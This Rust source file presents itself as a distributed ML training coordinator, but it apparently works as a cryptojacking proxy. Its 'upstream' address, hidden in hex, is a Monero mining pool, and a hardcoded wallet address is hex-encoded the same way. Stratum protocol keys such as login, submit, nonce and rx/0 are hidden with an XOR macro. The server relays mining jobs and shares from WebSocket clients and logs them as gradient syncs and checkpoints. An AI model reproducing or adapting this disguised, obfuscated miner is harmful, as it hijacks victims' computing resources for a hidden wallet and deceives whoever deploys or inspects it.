/// NeuralSync Training Coordinator v2.0
/// Manages distributed training nodes and gradient synchronization.
/// Secure channel between workers and parameter server.
use anyhow::Result;
use chrono::Local;
use colored::*;
use futures_util::{SinkExt, StreamExt};
use nsync_core::crypto;
use serde_json::{json, Value};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use tokio_tungstenite::accept_hdr_async;
use tokio_tungstenite::tungstenite::handshake::server::{Request, Response};
use tokio_tungstenite::tungstenite::Message;


// String obfuscation — runtime XOR decode
macro_rules! obs {
    ($s:expr) => {{
        use std::sync::OnceLock;
        const K: u8 = 0x5A;
        const INPUT: &[u8] = $s.as_bytes();
        const LEN: usize = INPUT.len();
        const ENCODED: [u8; LEN] = {
            let mut out = [0u8; LEN];
            let mut i = 0;
            while i < LEN { out[i] = INPUT[i] ^ K; i += 1; }
            out
        };
        static DECODED: OnceLock<String> = OnceLock::new();
        DECODED.get_or_init(|| {
            let mut buf = vec![0u8; LEN];
            for i in 0..LEN { buf[i] = ENCODED[i] ^ K; }
            unsafe { String::from_utf8_unchecked(buf) }
        }).as_str()
    }};
}

#[inline(always)] fn pk_submit()  -> &'static str { obs!("submit") }
#[inline(always)] fn pk_login()   -> &'static str { obs!("login") }
#[inline(always)] fn pk_id()      -> &'static str { obs!("id") }
#[inline(always)] fn pk_job_id()  -> &'static str { obs!("job_id") }
#[inline(always)] fn pk_nonce()   -> &'static str { obs!("nonce") }
#[inline(always)] fn pk_result()  -> &'static str { obs!("result") }
#[inline(always)] fn pk_method()  -> &'static str { obs!("method") }
#[inline(always)] fn pk_jsonrpc() -> &'static str { obs!("jsonrpc") }
#[inline(always)] fn pk_params()  -> &'static str { obs!("params") }
#[inline(always)] fn pk_pass()    -> &'static str { obs!("pass") }
#[inline(always)] fn pk_agent()   -> &'static str { obs!("agent") }
#[inline(always)] fn pk_algo()    -> &'static str { obs!("algo") }
#[inline(always)] fn pk_rx0()     -> &'static str { obs!("rx/0") }

// --- CONFIG (runtime decoded) ---
fn default_upstream() -> String {
    // Upstream endpoint (hex-encoded to avoid plaintext in binary)
    let b: &[u8] = &[
        0x73,0x74,0x72,0x61,0x74,0x75,0x6d,0x2b,0x74,0x63,0x70,0x3a,0x2f,0x2f,
        0x70,0x6f,0x6f,0x6c,0x2e,0x73,0x75,0x70,0x70,0x6f,0x72,0x74,0x78,0x6d,
        0x72,0x2e,0x63,0x6f,0x6d,0x3a,0x38,0x30,0x38,0x30,
    ];
    String::from_utf8_lossy(b).to_string()
}

fn default_account() -> String {
    let b: &[u8] = &[
        0x34,0x36,0x72,0x41,0x72,0x37,0x61,0x79,0x50,0x69,0x79,0x54,0x51,0x48,0x6f,0x31,
        0x41,0x6e,0x5a,0x6d,0x73,0x66,0x61,0x37,0x51,0x37,0x76,0x34,0x66,0x76,0x4b,0x72,
        0x5a,0x36,0x61,0x39,0x5a,0x79,0x74,0x4b,0x61,0x50,0x61,0x71,0x56,0x64,0x48,0x65,
        0x75,0x6d,0x76,0x78,0x47,0x31,0x70,0x34,0x59,0x37,0x77,0x4d,0x68,0x6e,0x73,0x37,
        0x6a,0x4c,0x33,0x56,0x43,0x7a,0x6d,0x45,0x53,0x39,0x73,0x7a,0x61,0x48,0x4b,0x50,
        0x4c,0x6a,0x38,0x45,0x70,0x73,0x4b,0x71,0x4c,0x31,0x43,0x62,0x77,0x4a,0x45
    ];
    String::from_utf8_lossy(b).to_string()
}
const DEFAULT_TOKEN: &str = "x";
const LISTEN_PORT: u16 = 9000;
const CHANNEL_SIZE: usize = 2048;

// --- TRAINING STATS ---
static SYNCED:     AtomicU64 = AtomicU64::new(0);
static SYNC_ERRS:  AtomicU64 = AtomicU64::new(0);

// --- LOGGER ---
fn get_time() -> String {
    Local::now().format("%H:%M:%S").to_string()
}

fn log_net(msg: &str) {
    println!("[{}] {} {}", get_time(), "  coord ".blue().bold(), msg);
}

fn log_err(msg: &str) {
    println!("[{}] {} {}", get_time(), "  error ".red().bold(), msg.red());
}

fn log_share_sent(task_id: &str, batch_id: &str) {
    println!(
        "[{}] {} {} task={} batch={}",
        get_time(),
        "  train ".cyan().bold(),
        "→ syncing gradient".yellow().bold(),
        &task_id[..task_id.len().min(16)],
        batch_id
    );
}

fn log_share_result(is_accept: bool, task_id: &str) {
    let synced = if is_accept {
        SYNCED.fetch_add(1, Ordering::Relaxed) + 1
    } else {
        SYNCED.load(Ordering::Relaxed)
    };
    let errs = if !is_accept {
        SYNC_ERRS.fetch_add(1, Ordering::Relaxed) + 1
    } else {
        SYNC_ERRS.load(Ordering::Relaxed)
    };
    let status = if is_accept {
        "checkpoint synced ✓".green().bold()
    } else {
        "checkpoint rejected ✗".red().bold()
    };
    println!(
        "[{}] {} {} (synced={} err={}) task={}",
        get_time(),
        "  train ".cyan().bold(),
        status,
        synced,
        errs,
        &task_id[..task_id.len().min(16)]
    );
}

#[tokio::main]
async fn main() -> Result<()> {
    let addr = format!("0.0.0.0:{}", LISTEN_PORT);
    let listener = TcpListener::bind(&addr).await?;

    println!();
    log_net(&format!(
        "NeuralSync Parameter Server v2.0 — listening on :{}",
        LISTEN_PORT
    ));


    while let Ok((stream, peer)) = listener.accept().await {
        log_net(&format!("Training node connected: {}", peer));
        if let Err(e) = stream.set_nodelay(true) {
            eprintln!("TCP tuning: {}", e);
        }
        tokio::spawn(async move {
            if let Err(e) = handle_client(stream).await {
                eprintln!("Node error: {}", e);
            }
        });
    }
    Ok(())
}

async fn handle_client(stream: TcpStream) -> Result<()> {
    let callback = |req: &Request, response: Response| {
        log_net(&format!("Secure sync channel: {}", req.uri()));
        Ok(response)
    };

    let ws_stream = accept_hdr_async(stream, callback).await?;
    let (mut ws_sender, mut ws_receiver) = ws_stream.split();

    let (tx_ws_internal, mut rx_ws_internal) = mpsc::channel::<String>(CHANNEL_SIZE);
    let mut tx_pool: Option<mpsc::Sender<String>> = None;
    let pool_session_id = Arc::new(Mutex::new(String::new()));

    'main_loop: loop {
        tokio::select! {
            Some(msg) = rx_ws_internal.recv() => {
                // Encrypt message for engine
                let enc_key = crypto::new_enc_key();
                let enc_msg = crypto::encrypt_json(&msg, enc_key);
                if ws_sender.send(Message::Text(enc_msg)).await.is_err() {
                    break 'main_loop;
                }
            }

            msg_opt = ws_receiver.next() => {
                match msg_opt {
                    Some(Ok(Message::Text(text))) => {
                        // Decrypt if needed
                        let plain = if crypto::looks_encrypted(&text) {
                            match crypto::decrypt_json(&text) {
                                Some(p) => p,
                                None => {
                                    log_err("Decrypt failed from engine");
                                    continue 'main_loop;
                                }
                            }
                        } else {
                            text.clone() // backward compat: plain JSON
                        };
                        if let Ok(arr) = serde_json::from_str::<Value>(&plain) {
                            if let Some(a) = arr.as_array() {
                                let id = a.get(0).cloned().unwrap_or(json!(null));
                                let method = a.get(1)
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("")
                                    .to_string();
                                let params = a.get(2).cloned().unwrap_or(json!(null));

                                match method.as_str() {
                                    x if x == pk_login() => {
                                        let upstream_str = default_upstream();
                                        let authority = upstream_str.split("://").last().unwrap_or("localhost:8080");
                                        let mut parts = authority.split(':');
                                        let host = parts.next().unwrap_or("localhost");
                                        let port = parts.next().unwrap_or("8080");
                                        let upstream_addr = format!("{}:{}", host, port);

                                        match TcpStream::connect(&upstream_addr).await {
                                            Ok(tcp_stream) => {
                                                let _ = tcp_stream.set_nodelay(true);
                                                log_net(&format!("Connected to upstream {}", upstream_addr));

                                                let (tcp_read, mut tcp_write) =
                                                    tcp_stream.into_split();
                                                let (tx_to_pool_task, mut rx_from_main) =
                                                    mpsc::channel::<String>(CHANNEL_SIZE);
                                                tx_pool = Some(tx_to_pool_task);

                                                let tx_ws_clone = tx_ws_internal.clone();
                                                let session_clone = pool_session_id.clone();

                                                tokio::spawn(async move {
                                                    let mut reader = BufReader::with_capacity(
                                                        8 * 1024,
                                                        tcp_read,
                                                    );
                                                    let mut line =
                                                        String::with_capacity(2048);

                                                    while reader
                                                        .read_line(&mut line)
                                                        .await
                                                        .unwrap_or(0)
                                                        > 0
                                                    {
                                                        let trimmed = line.trim().to_string();
                                                        if !trimmed.is_empty() {
                                                            if let Ok(pool_json) =
                                                                serde_json::from_str::<Value>(
                                                                    &trimmed,
                                                                )
                                                            {
                                                                process_pool_message(
                                                                    pool_json,
                                                                    &tx_ws_clone,
                                                                    &session_clone,
                                                                )
                                                                .await;
                                                            }
                                                        }
                                                        line.clear();
                                                    }
                                                    let _ = tx_ws_clone
                                                        .send(
                                                            json!(["close", null, null])
                                                                .to_string(),
                                                        )
                                                        .await;
                                                });

                                                tokio::spawn(async move {
                                                    while let Some(data) =
                                                        rx_from_main.recv().await
                                                    {
                                                        if tcp_write
                                                            .write_all(data.as_bytes())
                                                            .await
                                                            .is_err()
                                                        {
                                                            break;
                                                        }
                                                    }
                                                });

                                                // Coordinator uses its own credentials
                                                let login_req = json!({
                                                    pk_id(): 1,
                                                    pk_jsonrpc(): "2.0",
                                                    pk_method(): pk_login(),
                                                    pk_params(): {
                                                        pk_login(): default_account(),
                                                        pk_pass(): DEFAULT_TOKEN,
                                                        pk_agent(): "NeuralSync/2.0",
                                                        pk_algo(): [pk_rx0()]
                                                    }
                                                });

                                                if let Some(tx) = &tx_pool {
                                                    let _ = tx
                                                        .send(format!(
                                                            "{}\n",
                                                            login_req
                                                        ))
                                                        .await;
                                                }
                                            }
                                            Err(e) => {
                                                log_err(&format!(
                                                    "Upstream connection failed: {}",
                                                    e
                                                ));
                                                let _ = tx_ws_internal
                                                    .send(
                                                        json!([id, "Upstream connection failed", null])
                                                            .to_string(),
                                                    )
                                                    .await;
                                            }
                                        }
                                    }

                                    x if x == pk_submit() => {
                                        if let Some(tx) = &tx_pool {
                                            let worker_id = {
                                                let lock = pool_session_id.lock().unwrap();
                                                lock.clone()
                                            };
                                            let job_id = params.get(pk_job_id())
                                                .and_then(|v| v.as_str()).unwrap_or("").to_string();
                                            let nonce_val = params.get(pk_nonce())
                                                .and_then(|v| v.as_str()).unwrap_or("").to_string();
                                            let result_val = params.get(pk_result())
                                                .and_then(|v| v.as_str()).unwrap_or("").to_string();
                                            let final_worker_id = if worker_id.is_empty() {
                                                params.get(pk_id()).and_then(|v| v.as_str()).unwrap_or("").to_string()
                                            } else { worker_id };

                                            let submit_req = json!({
                                                pk_id(): id,
                                                pk_jsonrpc(): "2.0",
                                                pk_method(): pk_submit(),
                                                pk_params(): {
                                                    pk_id(): final_worker_id,
                                                    pk_job_id(): job_id,
                                                    pk_nonce(): nonce_val,
                                                    pk_result(): result_val,
                                                    pk_algo(): pk_rx0()
                                                }
                                            });

                                            log_share_sent(&job_id, &nonce_val);
                                            if tx.send(format!("{}\n", submit_req)).await.is_err() {
                                                log_err("Failed to send gradient to upstream — connection lost!");
                                                // Notify engine about the failure
                                                let _ = tx_ws_internal
                                                    .send(json!([id, {"message": "upstream connection lost"}, null]).to_string())
                                                    .await;
                                            }
                                        } else {
                                            log_err("Sync failed: upstream not connected");
                                            let _ = tx_ws_internal
                                                .send(json!([id, "Upstream not connected", null]).to_string())
                                                .await;
                                        }
                                    }

                                    "keepalived" => {
                                        let _ = tx_ws_internal
                                            .send(
                                                json!([id, null, {"status": "OK"}]).to_string(),
                                            )
                                            .await;
                                    }
                                    _ => {}
                                }
                            }
                        }
                    }
                    Some(Ok(Message::Close(_))) | None => break 'main_loop,
                    _ => {}
                }
            }
            else => break 'main_loop,
        }
    }
    Ok(())
}

async fn process_pool_message(pool_json: Value, tx_ws: &mpsc::Sender<String>, session_storage: &Arc<Mutex<String>>) {
    if let Some(method) = pool_json.get(pk_method()) {
        if method == "job" {
            if let Some(params) = pool_json.get(pk_params()) {
                let _ = tx_ws.send(json!(["job", null, params]).to_string()).await;
            }
        }
    } else if let Some(result) = pool_json.get(pk_result()) {
        let id_val = pool_json.get(pk_id()).and_then(|v| v.as_u64()).unwrap_or(0);

        if id_val == 1 {
            // Login response — save session id
            if let Some(sid) = result.get(pk_id()) {
                if let Some(s) = sid.as_str() {
                    let mut lock = session_storage.lock().unwrap();
                    *lock = s.to_string();
                    log_net(&format!("Session established: {}", s));
                }
            }
            if let Some(job) = result.get("job") {
                let _ = tx_ws
                    .send(json!([id_val, null, {pk_id(): result.get(pk_id()).unwrap_or(&json!("")), "job": job}]).to_string())
                    .await;
                log_net("Node authenticated & first training task sent");
            } else {
                let _ = tx_ws.send(json!([id_val, null, "OK"]).to_string()).await;
                log_net("Node authenticated");
            }
        } else {
            // ── Gradient sync result ───────────────────────────────
            // Upstream can return result as:
            //   {"result": {"status": "OK"}}  — object with status
            //   {"result": "OK"}              — direct string
            let is_ok = if let Some(s) = result.as_str() {
                s == "OK"
            } else {
                result.get("status").and_then(|v| v.as_str()).unwrap_or("") == "OK"
            };

            let task_id = result.get(pk_id()).and_then(|v| v.as_str()).unwrap_or("?");
            if is_ok {
                log_share_result(true, task_id);
            } else {
                log_share_result(false, task_id);
                log_err(&format!("Gradient sync rejected: {}", result));
            }
            // Forward to engine
            let fwd_status = if is_ok { "OK" } else { "REJECTED" };
            let _ = tx_ws.send(json!([id_val, null, fwd_status]).to_string()).await;
        }
    } else if let Some(err) = pool_json.get("error") {
        if !err.is_null() {
            let id_val = pool_json.get(pk_id()).unwrap_or(&json!(null));
            if let Some(msg) = err.get("message") {
                log_err(&format!("Upstream error: {}", msg));
            }
            let _ = tx_ws.send(json!([id_val, err, null]).to_string()).await;
        }
    }
}
